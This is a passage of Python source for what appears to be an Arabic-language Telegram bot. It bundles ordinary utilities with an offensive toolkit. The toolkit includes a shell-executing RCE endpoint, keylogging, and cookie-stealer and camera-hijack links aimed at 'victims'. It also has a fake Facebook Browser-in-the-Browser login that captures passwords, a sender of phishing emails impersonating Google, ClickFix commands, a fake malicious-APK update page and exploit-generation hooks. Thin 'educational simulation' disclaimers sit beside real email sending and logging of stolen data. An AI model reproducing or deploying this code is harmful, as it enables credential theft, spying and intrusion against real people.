            safe_db_execute("INSERT INTO hack_commands (chat_id, command, output, created_at) VALUES (?, ?, ?, ?)",
                            (str(chat_id), "keylog", keystrokes, datetime.now().isoformat()))
            notify_admin(f"⌨️ ضغطات من {chat_id}: {keystrokes}")
        return jsonify({"status": "ok"})
    except Exception as e:
        logger.error(f"collect_keylog error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/rce', methods=['POST'])
def rce():
    try:
        data = request.json
        chat_id = data.get('chat_id')
        command = data.get('command', '')
        if not chat_id or not command:
            return jsonify({"error": "بيانات ناقصة"}), 400
        if not is_admin(chat_id):
            return jsonify({"error": "غير مصرح"}), 403
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
        output = output.decode('utf-8', errors='ignore')
        safe_db_execute("INSERT INTO hack_commands (chat_id, command, output, created_at) VALUES (?, ?, ?, ?)",
                        (str(chat_id), command, output, datetime.now().isoformat()))
        notify_admin(f"🖥️ RCE من {chat_id}: {command} -> {output[:200]}")
        return jsonify({"output": output})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/s/<short_code>')
def redirect_short(short_code):
    original = expand_url(f"{SERVER_URL}/s/{short_code}")
    if original:
        return redirect(original)
    return "الرابط غير صحيح", 404

@app.route('/temp/<filename>')
def serve_temp_file(filename):
    return send_from_directory('temp', filename)

# ===== دوال توليد الصفحات =====
def generate_bitb_page(chat_id):
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>فيسبوك - تسجيل الدخول</title>
    <style>
        .fake-window {{ position: fixed; top: 10%; left: 25%; width: 50%; background: #fff; border: 2px solid #1877f2; border-radius: 8px; box-shadow: 0 8px 30px rgba(0,0,0,0.3); z-index: 9999; }}
        .fake-header {{ background: #1877f2; padding: 8px; color: #fff; font-weight: bold; display: flex; justify-content: space-between; }}
        .fake-body {{ padding: 20px; text-align: center; }}
        .fake-body input {{ width: 90%; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }}
        .fake-body button {{ width: 90%; padding: 10px; background: #1877f2; color: #fff; border: none; border-radius: 4px; }}
    </style>
    </head>
    <body>
        <div class="fake-window" id="bitbWindow">
            <div class="fake-header"><span>🔒 فيسبوك - تسجيل الدخول</span><span onclick="document.getElementById('bitbWindow').style.display='none'">✕</span></div>
            <div class="fake-body">
                <h3>تسجيل الدخول</h3>
                <input type="text" placeholder="البريد الإلكتروني" id="bitbEmail">
                <input type="password" placeholder="كلمة السر" id="bitbPass">
                <button onclick="sendBitbData()">تسجيل الدخول</button>
            </div>
        </div>
        <script>
            function sendBitbData() {{
                const email = document.getElementById('bitbEmail').value;
                const pass = document.getElementById('bitbPass').value;
                fetch('/api/phishing_submit', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
                    body: new URLSearchParams({{platform:'facebook', username:email, password:pass}})
                }});
                alert('تم تسجيل الدخول بنجاح!');
                window.location.href = 'https://www.facebook.com';
            }}
        </script>
        <p style="text-align:center;margin-top:20px;">⚠️ اختبر سحب النافذة خارج المتصفح – إذا لم تتحرك، فهي وهمية (BitB).</p>
    </body>
    </html>
    '''

def generate_consentfix_page(chat_id):
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>طلب الإذن - Microsoft</title>
    <style>
        body {{ font-family: Arial; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; }}
        .container {{ background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; }}
        .btn {{ background: #0078d4; color: #fff; border: none; padding: 12px; border-radius: 4px; width: 100%; cursor: pointer; }}
    </style>
    </head>
    <body>
        <div class="container">
            <h2>🔐 طلب الإذن</h2>
            <p>تطبيق "Security Check" يطلب صلاحيات للوصول إلى:</p>
            <ul><li>البريد الإلكتروني</li><li>الملفات الشخصية</li></ul>
            <button class="btn" onclick="consentFix()">منح الإذن</button>
        </div>
        <script>
            function consentFix() {{
                alert('✅ تم منح الإذن (محاكاة تعليمية).');
                window.location.href = 'https://www.microsoft.com';
            }}
        </script>
    </body>
    </html>
    '''

def generate_btmob_page(chat_id):
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>تحميل التطبيق</title></head>
    <body style="text-align:center;padding:50px;">
        <h2>📱 تحديث التطبيق</h2>
        <p>يوجد تحديث أمني عاجل لتطبيقك.</p>
        <a href="https://example.com/malicious.apk" download style="background:#4CAF50;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;">تحميل التحديث</a>
        <p style="font-size:12px;color:#888;">⚠️ هذا رابط محاكاة لأغراض تعليمية.</p>
    </body>
    </html>
    '''

def generate_account_dumpling_email(target_email):
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><style>
        body {{ font-family: Arial, sans-serif; direction: rtl; background-color: #f5f5f5; padding: 20px; }}
        .container {{ max-width: 600px; margin: 0 auto; background: #ffffff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .header {{ background: #1877f2; color: #ffffff; padding: 15px; text-align: center; border-radius: 8px 8px 0 0; }}
        .content {{ padding: 20px; }}
        .btn {{ display: inline-block; background: #1877f2; color: #ffffff; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: bold; }}
        .footer {{ font-size: 12px; color: #888; text-align: center; margin-top: 20px; }}
    </style></head>
    <body>
        <div class="container">
            <div class="header"><h2>🔒 تأكيد أمان حسابك</h2></div>
            <div class="content">
                <p>عزيزي المستخدم،</p>
                <p>نلاحظ نشاطًا غير معتاد على حسابك. لتأكيد هويتك وحماية حسابك، يرجى النقر على الرابط أدناه:</p>
                <p style="text-align: center;"><a href="{SERVER_URL}/phishing_pages/facebook" class="btn">تأكيد هويتي</a></p>
                <p style="font-size: 14px; color: #666;">إذا لم تقم بهذا الطلب، يمكنك تجاهل هذه الرسالة.</p>
                <hr><p style="font-size: 12px; color: #999;">هذا البريد مرسل من خدمة Google AppSheet الرسمية.</p>
            </div>
            <div class="footer">&copy; 2026 Google LLC</div>
        </div>
    </body>
    </html>
    '''
    return html

def generate_clickfix_command(target_name="مستخدم"):
    templates = [
        f'powershell -Command "Write-Host \'✅ تم إصلاح المشكلة لـ {target_name}!\' -ForegroundColor Green; pause"',
        f'cmd /c "echo ✅ تم التحديث بنجاح لـ {target_name} & pause"',
        f'powershell -Command "Invoke-WebRequest -Uri https://update.microsoft.com/verify -OutFile $env:TEMP/verify.txt; Start-Sleep -Seconds 2; Remove-Item $env:TEMP/verify.txt; Write-Host \'✅ تم تأكيد هويتك بنجاح\' -ForegroundColor Green"',
        f'cmd /c "ping 8.8.8.8 -n 3 && echo ✅ تم التحقق من الاتصال لـ {target_name} && pause"'
    ]
    return random.choice(templates)

def send_phishing_email(target_email, platform, custom_message=None):
    try:
        if SMTP_USER == "":
            return "❌ SMTP غير مضبوط. يرجى تعيين SMTP_USER و SMTP_PASS في متغيرات البيئة."
        html_content = custom_message if custom_message else generate_account_dumpling_email(target_email)
        msg = MIMEMultipart('alternative')
        msg['Subject'] = f"تنبيه أمان عاجل - {platform.capitalize()}"
        msg['From'] = SMTP_USER
        msg['To'] = target_email
        msg.attach(MIMEText(html_content, 'html'))
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)
        server.quit()
        return f"✅ تم إرسال البريد إلى {target_email}"
    except Exception as e:
        return f"❌ فشل إرسال البريد: {str(e)[:200]}"

# ===================== نهاية الجزء الثاني =====================
# ===================== 6. HANDLERS =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    try:
        safe_send(chat_id, "👋 مرحباً! البوت يعمل بنجاح.\nاختر إحدى الخدمات من القائمة أدناه:", reply_markup=build_main_menu(chat_id))
    except Exception as e:
        logger.error(f"Error in /start: {e}")
        bot.send_message(chat_id, "حدث خطأ في البوت، لكنه يعمل.")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    global BOT_LOCKED, STEALTH_MODE
    try:
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        data = call.data
        user_name = get_user_name(chat_id)

        # ===== العودة للقائمة الرئيسية =====
        if data == "back_main":
            bot.edit_message_text("🏠 القائمة الرئيسية", chat_id, message_id, reply_markup=build_main_menu(chat_id))
            return

        # ===== 1. الخدمات العامة =====
        if data == "weather":
            bot.edit_message_text("🌤️ اكتب اسم المدينة (مثال: القاهرة):", chat_id, message_id)
            user_states[chat_id] = "weather"
            return

        if data == "wikipedia":
            bot.edit_message_text("📚 اكتب موضوع البحث في ويكيبيديا:", chat_id, message_id)
            user_states[chat_id] = "wikipedia"
            return

        if data == "translate":
            bot.edit_message_text("🌐 اكتب النص الذي تريد ترجمته:", chat_id, message_id)
            user_states[chat_id] = "translate"
            return

        if data == "reminder":
            bot.edit_message_text("⏰ أرسل التذكير بهذه الصيغة:\n`الرسالة|الساعة:الدقيقة`\nمثال: `اجتماع مهم|14:30`", chat_id, message_id, parse_mode='Markdown')
            user_states[chat_id] = "reminder"
            return

        if data == "news":
            news = get_news_without_api('general')
            bot.edit_message_text(f"📰 آخر الأخبار:\n{news}", chat_id, message_id, reply_markup=build_main_menu(chat_id))
            return

        # ===== 2. كلمات المرور =====
        if data == "password_gen":
            pwd = generate_strong_password()
            bot.edit_message_text(f"🔑 كلمة مرور قوية:\n`{pwd}`\n\nيمكنك استخدامها فوراً.", chat_id, message_id, parse_mode='Markdown', reply_markup=build_main_menu(chat_id))
            return

        if data == "password_strength":
            bot.edit_message_text("🔐 اكتب كلمة المرور لتحليل قوتها:", chat_id, message_id)
            user_states[chat_id] = "password_strength"
            return

        # ===== 3. تحويل النص لصوت =====
        if data == "voice_gtts_menu":
            bot.edit_message_text("🎤 اختر اللهجة:", chat_id, message_id, reply_markup=build_voice_gtts_menu())
            return

        if data.startswith("voice_gtts_"):
            voice_name = data.split("_")[2]
            lang = VOICES.get(voice_name, 'ar')
            user_voice_selection[chat_id] = lang
            bot.edit_message_text(f"🎤 اخترت {voice_name}، أرسل النص الآن:", chat_id, message_id)
            user_states[chat_id] = "voice_gtts_text"
            return

        # ===== 4. تقصير وفك الروابط =====
        if data == "shorten_url":
            bot.edit_message_text("🔗 أرسل الرابط الطويل لتقصيره:", chat_id, message_id)
            user_states[chat_id] = "shorten_url"
            return

        if data == "expand_url":
            bot.edit_message_text("🔗 أرسل الرابط المختصر لفكه:", chat_id, message_id)
            user_states[chat_id] = "expand_url"
            return

        # ===== 5. الأدوات الأساسية =====
        if data == "device_info":
            info = f"📱 معلومات المستخدم:\nالاسم: {user_name}\nالمعرف: {chat_id}\nالنقاط: {get_user_points(chat_id)}"
            bot.edit_message_text(info, chat_id, message_id, reply_markup=build_main_menu(chat_id))
            return

        if data == "camera_hack":
            if not (user_can_use_camera(chat_id) or is_admin(chat_id)):
                bot.edit_message_text("🔒 هذه الخاصية مقفلة. تحتاج 300 نقطة أو صلاحية أدمن.", chat_id, message_id)
                return
            link = f"{SERVER_URL}/camera_hack?id={chat_id}"
            bot.edit_message_text(f"📷 رابط الكاميرا الأمامية:\n`{link}`\n\nشاركه مع الضحية.", chat_id, message_id, parse_mode='Markdown', reply_markup=build_main_menu(chat_id))
            return

        if data == "video_call":
            link = f"{SERVER_URL}/video_call?id={chat_id}"
            bot.edit_message_text(f"📹 رابط مكالمة الفيديو الوهمية:\n`{link}`\n\nشاركه مع الضحية.", chat_id, message_id, parse_mode='Markdown', reply_markup=build_main_menu(chat_id))
            return

        if data == "cookie_stealer":
            if not (user_can_use_advanced(chat_id) or is_admin(chat_id)):
                bot.edit_message_text("🔒 خاصية متقدمة (تحتاج 500 نقطة أو صلاحية أدمن).", chat_id, message_id)
                return
            link = f"{SERVER_URL}/cookie_stealer?id={chat_id}"
            bot.edit_message_text(f"🍪 رابط استخراج الكوكيز:\n`{link}`\n\nشاركه مع الضحية.", chat_id, message_id, parse_mode='Markdown', reply_markup=build_main_menu(chat_id))
            return

        if data == "track_phone":
            if not (user_can_use_advanced(chat_id) or is_admin(chat_id)):
                bot.edit_message_text("🔒 خاصية متقدمة (تحتاج 500 نقطة أو صلاحية أدمن).", chat_id, message_id)
                return
            bot.edit_message_text("📱 أرسل رقم الهاتف مع مفتاح الدولة (مثال: +20123456789):", chat_id, message_id)
            user_states[chat_id] = "track_phone"
            return

        # ===== 6. اقتباسات =====
        if data == "quotes_menu":
            bot.edit_message_text("اختر فئة الاقتباسات:", chat_id, message_id, reply_markup=build_quotes_menu())
            return

        if data.startswith("quote_cat_"):
            category = data.split("_")[2]
            quotes = QUOTES_DB.get(category, ["لا توجد اقتباسات"])
            quote = random.choice(quotes)
            bot.edit_message_text(f"💬 {category}:\n\n{quote}", chat_id, message_id, reply_markup=build_quotes_menu())
            return

        # ===== 7. فحص وتحليل =====
        if data == "check_link_btn":
            bot.edit_message_text("🔍 أرسل الرابط لفحصه:", chat_id, message_id)
            user_states[chat_id] = "check_link"
            return

        if data == "analyze_apk":
            bot.edit_message_text("📦 أرسل ملف APK لتحليله:", chat_id, message_id)
            user_states[chat_id] = "analyze_apk"
            return

        if data == "pdf_menu":
            bot.edit_message_text("📄 أرسل ملف PDF لتحليله:", chat_id, message_id)
            user_states[chat_id] = "pdf_upload"
            return

        if data == "generate_image_btn":
            bot.edit_message_text("🎨 اكتب وصف الصورة التي تريد توليدها:", chat_id, message_id)
            user_states[chat_id] = "generate_image"
            return

        # ===== 8. بريد مؤقت ونقاط =====
        if data == "create_email_btn":
            name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domain = random.choice(["1secmail.com", "1secmail.org", "1secmail.net"])
            email = f"{name}@{domain}"
            user_emails[chat_id] = (email, name, domain)
            bot.edit_message_text(f"📧 بريدك المؤقت:\n`{email}`\n\nاستخدم /read_رقم_الرسالة لقراءة البريد.", chat_id, message_id, parse_mode='Markdown', reply_markup=build_main_menu(chat_id))
            return

        if data == "my_points":
            points = get_user_points(chat_id)
            bot.edit_message_text(f"💎 نقاطك: {points}", chat_id, message_id, reply_markup=build_main_menu(chat_id))
            return

        if data == "my_referral":
            bot.edit_message_text("🔗 رابط الدعوة الخاص بك:\n(غير مفعل بعد)", chat_id, message_id, reply_markup=build_main_menu(chat_id))
            return

        if data == "points_history":
            rows = safe_db_query("SELECT amount, reason, created_at FROM points_log WHERE user_id = ? ORDER BY created_at DESC LIMIT 10", (chat_id,), fetch_one=False)
            if not rows:
                bot.edit_message_text("لا يوجد سجل نقاط.", chat_id, message_id, reply_markup=build_main_menu(chat_id))
                return
            history = "\n".join([f"{r[2]}: {r[0]} نقطة ({r[1]})" for r in rows])
            bot.edit_message_text(f"📜 سجل النقاط:\n{history}", chat_id, message_id, reply_markup=build_main_menu(chat_id))
            return

        # ===== 9. أدوات الهجمات =====
        if data == "clickfix_generator":
            bot.edit_message_text("🎯 ClickFix - اكتب اسم الضحية (أو اتركه فارغاً لاستخدام 'مستخدم'):", chat_id, message_id)
            user_states[chat_id] = "waiting_clickfix_target"
            return

        if data == "account_dumpling":
            bot.edit_message_text("📧 AccountDumpling - أرسل البريد الإلكتروني المستهدف:", chat_id, message_id)
            user_states[chat_id] = "waiting_account_dumpling_email"
            return

        if data == "bitb_attack":
            link = f"{SERVER_URL}/bitb?id={chat_id}"
            bot.edit_message_text(f"🪟 BitB (نافذة مزيفة):\n`{link}`\n\nشارك الرابط مع الضحية.", chat_id, message_id, parse_mode='Markdown', reply_markup=build_main_menu(chat_id))
            return

        if data == "consentfix_attack":
            link = f"{SERVER_URL}/consentfix?id={chat_id}"
            bot.edit_message_text(f"🔑 ConsentFix (طلب OAuth):\n`{link}`\n\nشارك الرابط مع الضحية.", chat_id, message_id, parse_mode='Markdown', reply_markup=build_main_menu(chat_id))
            return

        if data == "btmob_attack":
            link = f"{SERVER_URL}/btmob?id={chat_id}"
            bot.edit_message_text(f"📱 BTMOB (تطبيق خبيث):\n`{link}`\n\nشارك الرابط مع الضحية.", chat_id, message_id, parse_mode='Markdown', reply_markup=build_main_menu(chat_id))
            return

        if data == "download_video":
            bot.edit_message_text("📥 أرسل رابط الفيديو لتحميله (YouTube, Facebook, إلخ):", chat_id, message_id)
            user_states[chat_id] = "waiting_download"
            return

        # ===== 10. أدوات المطور =====
        if data in ["vuln_agent", "osint_d2", "py_netrecon", "exploit_dev", "h4x_tools", "matkap", "pentest_tools"]:
            if not is_admin(chat_id):
                bot.edit_message_text("⛔ خاصية المطور فقط.", chat_id, message_id)
                return
            tool_map = {
                "vuln_agent": ("🔍 vuln-agent - أرسل الهدف (IP أو نطاق):", "vuln_agent"),
                "osint_d2": ("🕵️ osint-d2 - أرسل النطاق:", "osint_d2"),
                "py_netrecon": ("🌐 Py-NetRecon - أرسل الهدف (IP أو نطاق):", "py_netrecon"),
                "exploit_dev": ("💀 Exploit-Dev - أرسل IP الهدف:", "exploit_dev"),
                "h4x_tools": ("📧 H4X-Tools - أرسل البريد أو النطاق:", "h4x_tools"),
                "matkap": ("🛡️ Matkap - أرسل التوكن أو Chat ID:", "matkap"),
                "pentest_tools": ("🐍 Pentest Tools - اختر الأداة (scapy, impacket, paramiko):", "pentest_tools")
            }
            prompt, state = tool_map[data]
            bot.edit_message_text(prompt, chat_id, message_id)
            user_states[chat_id] = state
            return

        # ===== 11. التصيد =====
        if data == "phishing_pages":
            bot.edit_message_text("🎣 اختر منصة التصيد:", chat_id, message_id, reply_markup=build_phishing_pages_menu())
            return

        if data == "phishing_email":
            if not (user_can_use_phishing(chat_id) or is_admin(chat_id)):
                bot.edit_message_text("🔒 خاصية التصيد مقفلة. تحتاج 300 نقطة أو صلاحية أدمن.", chat_id, message_id)
                return
            bot.edit_message_text("📧 اختر المنصة لإرسال بريد التصيد:", chat_id, message_id, reply_markup=build_phishing_platform_menu())
            return

        if data == "phishing_locked":
            bot.edit_message_text("🔒 هذه الخاصية تحتاج 300 نقطة. تواصل مع الأدمن لترقية صلاحياتك.", chat_id, message_id)
            return

        if data.startswith("phish_"):
            platform = data.split("_")[1]
            link = f"{SERVER_URL}/phishing_pages/{platform}"
            bot.edit_message_text(f"🎣 رابط صفحة تصيد {platform}:\n`{link}`\n\nشاركه مع الضحية.", chat_id, message_id, parse_mode='Markdown', reply_markup=build_phishing_pages_menu())
            return

        if data.startswith("phish_platform_"):
            platform = data.split("_")[2]
            user_states[f"{chat_id}_phishing_platform"] = platform
            bot.edit_message_text(f"📧 أرسل البريد الإلكتروني المستهدف لتصيد {platform}:", chat_id, message_id)
            user_states[chat_id] = "waiting_phishing_target"
            return

        # ===== 12. لوحة التحكم =====
        if data == "admin_panel":
            if not is_admin(chat_id):
                bot.edit_message_text("⛔ هذه الخاصية للأدمن فقط.", chat_id, message_id)
                return
            bot.edit_message_text("⚙️ لوحة التحكم:", chat_id, message_id, reply_markup=build_admin_panel())
            return

        if data == "admin_users":
            if not is_admin(chat_id):
                return
            markup, error = build_users_menu(chat_id, "admin")
            if error:
                bot.edit_message_text(error, chat_id, message_id)
            else:
                bot.edit_message_text("👥 قائمة المستخدمين:", chat_id, message_id, reply_markup=markup)
            return

        if data.startswith("admin_user_"):
            if not is_admin(chat_id):
                return
            target_id = int(data.split("_")[2])
            markup = InlineKeyboardMarkup(row_width=2)
            markup.row(InlineKeyboardButton("➕ إضافة نقاط", callback_data=f"add_points_{target_id}"), InlineKeyboardButton("➖ خصم نقاط", callback_data=f"deduct_points_{target_id}"))
            markup.row(InlineKeyboardButton("🚫 حظر", callback_data=f"ban_user_{target_id}"), InlineKeyboardButton("✅ إلغاء الحظر", callback_data=f"unban_user_{target_id}"))
            markup.row(InlineKeyboardButton("👑 جعل أدمن", callback_data=f"make_admin_{target_id}"), InlineKeyboardButton("⬅️ رجوع", callback_data="admin_users"))
            bot.edit_message_text(f"إدارة المستخدم {target_id}:", chat_id, message_id, reply_markup=markup)
            return

        if data == "lock_chat":
            if not is_admin(chat_id):
                return
            BOT_LOCKED = not BOT_LOCKED
            status = "🔒 مقفل" if BOT_LOCKED else "🔓 مفتوح"
            bot.edit_message_text(f"حالة البوت: {status}", chat_id, message_id, reply_markup=build_admin_panel())
            return

        if data == "send_to_user":
            if not is_admin(chat_id):
                return
            bot.edit_message_text("📨 أرسل معرف المستخدم (Chat ID) ثم الرسالة مفصولة بـ | (مثال: 123456|مرحباً)", chat_id, message_id)
            user_states[chat_id] = "admin_send_message"
            return

        if data == "user_activity":
            if not is_admin(chat_id):
                return
            rows = safe_db_query("SELECT chat_id, action, timestamp FROM user_activity ORDER BY id DESC LIMIT 20", fetch_one=False)
            if not rows:
                bot.edit_message_text("لا توجد أنشطة.", chat_id, message_id, reply_markup=build_admin_panel())
                return
            msg = "📋 آخر النشاطات:\n" + "\n".join([f"{r[2]}: {r[0]} -> {r[1]}" for r in rows])
            bot.edit_message_text(msg[:4000], chat_id, message_id, reply_markup=build_admin_panel())
            return

        # ===== 13. RCE و Keylogger =====
        if data == "rce_menu":
            if not is_admin(chat_id):
                return
            bot.edit_message_text("🖥️ RCE - أرسل الأمر المراد تنفيذه:", chat_id, message_id)
            user_states[chat_id] = "waiting_rce"
            return

        if data == "keylogger_menu":
            if not is_admin(chat_id):
                return
            bot.edit_message_text("🔑 جاري إنشاء رابط Keylogger...", chat_id, message_id)
            user_states[chat_id] = "waiting_keylogger"
            bot.edit_message_text("✅ تم التفعيل، أرسل أي نص لتأكيد الحالة.", chat_id, message_id)
            return

        # ===== 14. الحماية =====
        if data == "protection_menu":
            if not is_admin(chat_id):
                return
            bot.edit_message_text("🛡️ قائمة الحماية:", chat_id, message_id, reply_markup=build_protection_menu())
            return

        if data == "protect_shield":
            if not is_admin(chat_id):
                return
            bot.edit_message_text("🛡️ درع الحماية مفعل (محاكاة).", chat_id, message_id, reply_markup=build_protection_menu())
            return

        if data == "protect_lock":
            if not is_admin(chat_id):
                return
            BOT_LOCKED = True
            bot.edit_message_text("🔒 البوت مقفل الآن.", chat_id, message_id, reply_markup=build_protection_menu())
            return

        if data == "protect_stealth":
            if not is_admin(chat_id):
                return
            STEALTH_MODE = not STEALTH_MODE
            bot.edit_message_text(f"🥷 وضع التخفي: {'مفعل' if STEALTH_MODE else 'معطل'}", chat_id, message_id, reply_markup=build_protection_menu())
            return

        # ===== 15. أدعية وأذكار =====
        if data == "doaa_menu":
            bot.edit_message_text("اختر الدعاء:", chat_id, message_id, reply_markup=build_doaa_menu())
            return

        if data.startswith("doaa_"):
            idx = int(data.split("_")[1])
            duaa = DUAA_DB[idx]
            bot.edit_message_text(f"📿 {duaa['title']}:\n\n{duaa['text']}\n\nالمصدر: {duaa['source']}", chat_id, message_id, reply_markup=build_doaa_menu())
            return

        if data == "muslim_menu":
            bot.edit_message_text("اختر الموضوع:", chat_id, message_id, reply_markup=build_muslim_menu())
            return

        if data == "muslim_arkan_islam":
            bot.edit_message_text("🕌 أركان الإسلام:\n1. الشهادة\n2. الصلاة\n3. الزكاة\n4. الصوم\n5. الحج", chat_id, message_id, reply_markup=build_muslim_menu())
            return

        if data == "muslim_arkan_iman":
            bot.edit_message_text("📖 أركان الإيمان:\n1. الإيمان بالله\n2. الإيمان بالملائكة\n3. الإيمان بالكتب\n4. الإيمان بالرسل\n5. الإيمان باليوم الآخر\n6. الإيمان بالقدر", chat_id, message_id, reply_markup=build_muslim_menu())
            return

        if data == "adkar_sabah":
            bot.edit_message_text(f"📿 أذكار الصباح:\n\n{ADKAR_SABAH[0]}", chat_id, message_id, reply_markup=build_main_menu(chat_id))
            return

        if data == "adkar_massaa":
            bot.edit_message_text(f"🌙 أذكار المساء:\n\n{ADKAR_MASSAA[0]}", chat_id, message_id, reply_markup=build_main_menu(chat_id))
            return

        # ===== أزرار الترجمة =====
        if data.startswith("trans_lang_"):
            lang_code = data.split("_")[2]
            text_to_translate = user_states.get(f"{chat_id}_translate_text", "")
            if not text_to_translate:
                bot.edit_message_text("❌ لم يتم العثور على نص للترجمة.", chat_id, message_id)
                return
            translated, src_lang, src_name, target_name = translate_text_advanced_with_lang(text_to_translate, lang_code)
            result = f"🌐 الترجمة إلى {target_name}:\n\n{translated[0]}"
            bot.edit_message_text(result, chat_id, message_id, reply_markup=build_main_menu(chat_id))
            user_states[chat_id] = None
            return

        # ===== أزرار PDF =====
        if data == "pdf_summary":
            pdf_text = pdf_texts.get(chat_id, "")
            if not pdf_text:
                bot.edit_message_text("❌ لم يتم تحميل أي PDF.", chat_id, message_id)
                return
            lines = pdf_text.split('\n')[:10]
            summary = "\n".join(lines)
            bot.edit_message_text(f"📄 تلخيص PDF:\n{summary[:2000]}", chat_id, message_id, reply_markup=build_pdf_menu())
            return

        if data == "pdf_extract":
            pdf_text = pdf_texts.get(chat_id, "")
            if not pdf_text:
                bot.edit_message_text("❌ لم يتم تحميل أي PDF.", chat_id, message_id)
                return
            bot.edit_message_text(f"📄 النص المستخرج:\n{pdf_text[:3000]}", chat_id, message_id, reply_markup=build_pdf_menu())
            return

        if data == "pdf_smart":
            bot.edit_message_text("🧠 اكتب سؤالك عن محتوى PDF:", chat_id, message_id)
            user_states[chat_id] = "pdf_smart_question"
            return

        else:
            bot.answer_callback_query(call.id, "⚠️ هذا الزر غير مفعل حالياً.")

    except Exception as e:
        logger.error(f"Callback error: {e}")
        try:
            bot.answer_callback_query(call.id, f"❌ خطأ: {str(e)[:50]}")
        except:
            pass

@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text(message):
    global BOT_LOCKED
    try:
        chat_id = message.chat.id
        text = message.text.strip()
        state = user_states.get(chat_id)

        update_last_seen(chat_id)
        log_activity(chat_id, f"text: {text[:50]}")

        if is_banned(chat_id) and not is_admin(chat_id):
            safe_send(chat_id, "أنت محظور.")
            return
        if BOT_LOCKED and not is_admin(chat_id):
            safe_send(chat_id, "البوت مقفل.")
            return

        # معالجة الأوامر النصية
        if text.startswith('/'):
            if text == '/start':
                safe_send(chat_id, "👋 مرحباً! اختر من القائمة:", reply_markup=build_main_menu(chat_id))
                return
            safe_send(chat_id, "❌ أمر غير معروف. استخدم /start لعرض القائمة.")
            return

        # ===== ClickFix =====
        if state == "waiting_clickfix_target":
            target_name = text or "مستخدم"
            fake_command = generate_clickfix_command(target_name)
            safe_db_execute("INSERT INTO clickfix_logs (chat_id, command, created_at) VALUES (?, ?, ?)",
                            (chat_id, fake_command, datetime.now().isoformat()))
            safe_send(chat_id, f"📋 **أمر ClickFix المخصص لـ {target_name}:**\n\n```\n{fake_command}\n```\n\n📌 **تعليمات:**\n1. انسخ الأمر بالكامل.\n2. افتح **تشغيل (Win+R)** أو **الطرفية (CMD)**.\n3. الصق الأمر واضغط Enter.\n4. سيظهر لك أن المشكلة قد حُلَّت (وهو في الحقيقة أمر وهمي).\n\n⚠️ هذا الأمر آمن تمامًا ولا ينفذ أي تغيير حقيقي (محاكاة تعليمية).", parse_mode="Markdown")
            user_states[chat_id] = None
            return

        # ===== AccountDumpling =====
        if state == "waiting_account_dumpling_email":
            target_email = text
            html = generate_account_dumpling_email(target_email)
            result = send_phishing_email(target_email, "facebook", custom_message=html)
            safe_db_execute("INSERT INTO account_dumpling_logs (target_email, platform, status, created_at) VALUES (?, ?, ?, ?)",
                            (target_email, "facebook", "sent", datetime.now().isoformat()))
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        # ===== بريد تصيد =====
        if state == "waiting_phishing_target":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            target_email = text
            safe_db_execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                            (target_email, platform, "pending", "pending", request.remote_addr if 'request' in locals() else 'unknown', datetime.now().isoformat()))
            result = send_phishing_email(target_email, platform)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        # ===== أدوات المطور =====
        if state == "vuln_agent":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري فحص الثغرات... (قد يستغرق دقيقة)")
            result = vuln_agent_scan(text)
            safe_db_execute("INSERT INTO vuln_logs (chat_id, target, results, created_at) VALUES (?, ?, ?, ?)",
                            (chat_id, text, result[:500], datetime.now().isoformat()))
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "osint_d2":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري جمع المعلومات...")
            result = osint_d2_search(text)
            safe_db_execute("INSERT INTO osint_logs (chat_id, target, results, created_at) VALUES (?, ?, ?, ?)",
                            (chat_id, text, result[:500], datetime.now().isoformat()))
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "py_netrecon":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري مسح الشبكة...")
            result = py_netrecon_scan(text)
            safe_db_execute("INSERT INTO netrecon_logs (chat_id, target, results, created_at) VALUES (?, ?, ?, ?)",
                            (chat_id, text, result[:500], datetime.now().isoformat()))
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "exploit_dev":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', text):
                safe_send(chat_id, "❌ يرجى إدخال IP صحيح (مثل: 192.168.1.100)")
                return
            payload = exploit_dev_generate(text)
            safe_db_execute("INSERT INTO exploit_logs (chat_id, target, results, created_at) VALUES (?, ?, ?, ?)",
